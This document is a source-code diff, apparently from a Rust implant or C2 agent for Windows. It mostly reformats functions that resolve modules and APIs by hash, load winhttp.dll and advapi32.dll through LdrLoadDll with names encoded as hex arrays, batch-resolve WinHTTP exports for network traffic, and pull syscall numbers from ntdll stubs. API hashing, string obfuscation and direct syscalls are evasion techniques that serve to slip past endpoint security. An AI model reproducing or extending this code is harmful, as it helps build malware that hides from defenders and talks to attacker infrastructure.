@@ -342,125 +342,173 @@ pub unsafe fn initialize_syscalls(mut ntdll: *mut c_void) -> bool {
 
         state.modules.kernel32 = resolver::ldr_module_search(hashes::KERNEL32_HASH);
 
-        state.win32.get_computer_name_ex_w = resolver::ldr_function_by_hash(state.modules.kernel32, hashes::GETCOMPUTERNAMEEXW_HASH);
+        state.win32.get_computer_name_ex_w =
+            resolver::ldr_function_by_hash(state.modules.kernel32, hashes::GETCOMPUTERNAMEEXW_HASH);
 
         // Just to verify at least one critical syscall resolved successfully
         state.ssns.nt_close.ssn != 0 && !state.ssns.nt_close.syscall_addr.is_null()
     }
 }
 
+pub unsafe fn initialize_network() -> bool {
+    unsafe {
+        let state = &mut *NATIVE.0.get();
 
-pub unsafe fn initialize_network() -> bool { unsafe {
-    let state = &mut *NATIVE.0.get();
+        // Skip if already initialized
+        if !state.modules.winhttp.is_null() {
+            return true;
+        }
 
-    // Skip if already initialized
-    if !state.modules.winhttp.is_null() {
-        return true;
-    }
+        debug!(
+            "[NET] LdrLoadDll resolved: {}",
+            !state.win32.ldr_load_dll.is_null()
+        );
 
-    debug!("[NET] LdrLoadDll resolved: {}", !state.win32.ldr_load_dll.is_null());
-
-    // Load winhttp.dll via LdrLoadDll
-    // w\0i\0n\0h\0t\0t\0p\0.\0d\0l\0l\0\0
-    let winhttp_name: [u16; 12] = [
-        0x0077, 0x0069, 0x006E, 0x0068, 0x0074, 0x0074, 
-        0x0070, 0x002E, 0x0064, 0x006C, 0x006C, 0x0000,
-    ];
-    state.modules.winhttp = load_module(hashes::WINHTTP_DLL_HASH, Some(&winhttp_name));
-    debug!("[NET] winhttp.dll loaded: {}", !state.modules.winhttp.is_null());
-    if state.modules.winhttp.is_null() {
-        return false;
-    }
-
-    // Batch resolve all WinHTTP functions in one pass
-    {
-        use core::ptr::addr_of_mut;
-        let p = NATIVE.0.get();
-        let winhttp = (*p).modules.winhttp;
-        let mut batch: [(u32, *mut *mut c_void); 10] = [
-            (hashes::WINHTTPOPEN_HASH, addr_of_mut!((*p).win32.winhttp_open)),
-            (hashes::WINHTTPCONNECT_HASH, addr_of_mut!((*p).win32.winhttp_connect)),
-            (hashes::WINHTTPOPENREQUEST_HASH, addr_of_mut!((*p).win32.winhttp_open_request)),
-            (hashes::WINHTTPSENDREQUEST_HASH, addr_of_mut!((*p).win32.winhttp_send_request)),
-            (hashes::WINHTTPRECEIVERESPONSE_HASH, addr_of_mut!((*p).win32.winhttp_receive_response)),
-            (hashes::WINHTTPREADDATA_HASH, addr_of_mut!((*p).win32.winhttp_read_data)),
-            (hashes::WINHTTPSETOPTION_HASH, addr_of_mut!((*p).win32.winhttp_set_option)),
-            (hashes::WINHTTPCLOSEHANDLE_HASH, addr_of_mut!((*p).win32.winhttp_close_handle)),
-            (hashes::WINHTTPQUERYDATAAVAILABLE_HASH, addr_of_mut!((*p).win32.winhttp_query_data_available)),
-            (hashes::WINHTTPADDREQUESTHEADERS_HASH, addr_of_mut!((*p).win32.winhttp_add_request_headers)),
+        // Load winhttp.dll via LdrLoadDll
+        // w\0i\0n\0h\0t\0t\0p\0.\0d\0l\0l\0\0
+        let winhttp_name: [u16; 12] = [
+            0x0077, 0x0069, 0x006E, 0x0068, 0x0074, 0x0074, 0x0070, 0x002E, 0x0064, 0x006C, 0x006C,
+            0x0000,
         ];
-        resolver::resolve_exports_batch(winhttp, &mut batch);
-    }
+        state.modules.winhttp = load_module(hashes::WINHTTP_DLL_HASH, Some(&winhttp_name));
+        debug!(
+            "[NET] winhttp.dll loaded: {}",
+            !state.modules.winhttp.is_null()
+        );
+        if state.modules.winhttp.is_null() {
+            return false;
+        }
 
-    // Load advapi32.dll for GetUserNameW
-    let advapi32_name: [u16; 13] = [
-        0x0061, 0x0064, 0x0076, 0x0061, 0x0070, 0x0069, 0x0033, 
-        0x0032, 0x002E, 0x0064, 0x006C, 0x006C, 0x0000,
-    ];
-    state.modules.advapi32 = load_module(hashes::ADVAPI32_DLL_HASH, Some(&advapi32_name));
-    if !state.modules.advapi32.is_null() {
-        state.win32.get_user_name_w = resolver::ldr_function_by_hash(state.modules.advapi32, hashes::GETUSERNAMEW_HASH);
-    }
+        // Batch resolve all WinHTTP functions in one pass
+        {
+            use core::ptr::addr_of_mut;
+            let p = NATIVE.0.get();
+            let winhttp = (*p).modules.winhttp;
+            let mut batch: [(u32, *mut *mut c_void); 10] = [
+                (
+                    hashes::WINHTTPOPEN_HASH,
+                    addr_of_mut!((*p).win32.winhttp_open),
+                ),
+                (
+                    hashes::WINHTTPCONNECT_HASH,
+                    addr_of_mut!((*p).win32.winhttp_connect),
+                ),
+                (
+                    hashes::WINHTTPOPENREQUEST_HASH,
+                    addr_of_mut!((*p).win32.winhttp_open_request),
+                ),
+                (
+                    hashes::WINHTTPSENDREQUEST_HASH,
+                    addr_of_mut!((*p).win32.winhttp_send_request),
+                ),
+                (
+                    hashes::WINHTTPRECEIVERESPONSE_HASH,
+                    addr_of_mut!((*p).win32.winhttp_receive_response),
+                ),
+                (
+                    hashes::WINHTTPREADDATA_HASH,
+                    addr_of_mut!((*p).win32.winhttp_read_data),
+                ),
+                (
+                    hashes::WINHTTPSETOPTION_HASH,
+                    addr_of_mut!((*p).win32.winhttp_set_option),
+                ),
+                (
+                    hashes::WINHTTPCLOSEHANDLE_HASH,
+                    addr_of_mut!((*p).win32.winhttp_close_handle),
+                ),
+                (
+                    hashes::WINHTTPQUERYDATAAVAILABLE_HASH,
+                    addr_of_mut!((*p).win32.winhttp_query_data_available),
+                ),
+                (
+                    hashes::WINHTTPADDREQUESTHEADERS_HASH,
+                    addr_of_mut!((*p).win32.winhttp_add_request_headers),
+                ),
+            ];
+            resolver::resolve_exports_batch(winhttp, &mut batch);
+        }
 
-    // Verify crucial WinHTTP function resolved
-    !state.win32.winhttp_open.is_null() && !state.win32.winhttp_connect.is_null() && !state.win32.winhttp_send_request.is_null()
-}}
+        // Load advapi32.dll for GetUserNameW
+        let advapi32_name: [u16; 13] = [
+            0x0061, 0x0064, 0x0076, 0x0061, 0x0070, 0x0069, 0x0033, 0x0032, 0x002E, 0x0064, 0x006C,
+            0x006C, 0x0000,
+        ];
+        state.modules.advapi32 = load_module(hashes::ADVAPI32_DLL_HASH, Some(&advapi32_name));
+        if !state.modules.advapi32.is_null() {
+            state.win32.get_user_name_w =
+                resolver::ldr_function_by_hash(state.modules.advapi32, hashes::GETUSERNAMEW_HASH);
+        }
+
+        // Verify crucial WinHTTP function resolved
+        !state.win32.winhttp_open.is_null()
+            && !state.win32.winhttp_connect.is_null()
+            && !state.win32.winhttp_send_request.is_null()
+    }
+}
 
 /**
  * Resolves or load a module by its hash or name
  * */
-pub unsafe fn load_module(module_hash: u32, module_name: Option<&[u16]>) -> HANDLE { unsafe {
-    let base = resolver::ldr_module_search(module_hash);
-    if !base.is_null() {
-        return base;
-    }
+pub unsafe fn load_module(module_hash: u32, module_name: Option<&[u16]>) -> HANDLE {
+    unsafe {
+        let base = resolver::ldr_module_search(module_hash);
+        if !base.is_null() {
+            return base;
+        }
 
-    if let Some(name) = module_name {
-        let state = &*NATIVE.0.get();
-        if !state.win32.ldr_load_dll.is_null() {
-            let byte_len = name.len() * 2;
-            let str_len = if name.last() == Some(&0) { byte_len - 2 } else { byte_len };
-            let mut unicode_str = crate::core::types::UnicodeString {
-                length: str_len as u16,
-                maximum_length: byte_len as u16,
-                buffer: name.as_ptr(),
-            };
-            let mut module_handle: *mut c_void = core::ptr::null_mut();
+        if let Some(name) = module_name {
+            let state = &*NATIVE.0.get();
+            if !state.win32.ldr_load_dll.is_null() {
+                let byte_len = name.len() * 2;
+                let str_len = if name.last() == Some(&0) {
+                    byte_len - 2
+                } else {
+                    byte_len
+                };
+                let mut unicode_str = crate::core::types::UnicodeString {
+                    length: str_len as u16,
+                    maximum_length: byte_len as u16,
+                    buffer: name.as_ptr(),
+                };
+                let mut module_handle: *mut c_void = core::ptr::null_mut();
 
-            type FnLdrLoadDll = unsafe extern "system" fn(
-                *mut c_void,
-                *mut u32,
-                *mut crate::core::types::UnicodeString,
-                *mut *mut c_void,
-            ) -> i32;
+                type FnLdrLoadDll = unsafe extern "system" fn(
+                    *mut c_void,
+                    *mut u32,
+                    *mut crate::core::types::UnicodeString,
+                    *mut *mut c_void,
+                ) -> i32;
 
-            let ldr_load: FnLdrLoadDll = core::mem::transmute(state.win32.ldr_load_dll);
-            let status = ldr_load(
-                core::ptr::null_mut(),
-                core::ptr::null_mut(),
-                &mut unicode_str,
-                &mut module_handle
-            );
+                let ldr_load: FnLdrLoadDll = core::mem::transmute(state.win32.ldr_load_dll);
+                let status = ldr_load(
+                    core::ptr::null_mut(),
+                    core::ptr::null_mut(),
+                    &mut unicode_str,
+                    &mut module_handle,
+                );
 
-            if status == 0 && !module_handle.is_null() {
-                return module_handle;
+                if status == 0 && !module_handle.is_null() {
+                    return module_handle;
+                }
             }
         }
+
+        core::ptr::null_mut()
     }
-
-    core::ptr::null_mut()
-}}
-
+}
 
 /**
  * Resolves a function address from a module using its hash
  * */
-pub unsafe fn resolve_function(module: HANDLE, function_hash: u32) -> *mut c_void { unsafe {
-    if module.is_null() {
-        return core::ptr::null_mut();
+pub unsafe fn resolve_function(module: HANDLE, function_hash: u32) -> *mut c_void {
+    unsafe {
+        if module.is_null() {
+            return core::ptr::null_mut();
+        }
+        resolver::ldr_function_by_hash(module, function_hash)
     }
-    resolver::ldr_function_by_hash(module, function_hash)
-}}
+}
 
 /**
  * Extracts the SSN and syscall instruction address from NTAPI stub
@@ -597,7 +645,6 @@ unsafe fn is_wow64() -> bool {
     core::arch::asm!("mov {}, fs:[0xC0]", out(reg) teb_value);
     teb_value != 0
 }
-
 
 /**
  * Returns a reference to the initialized syscall table
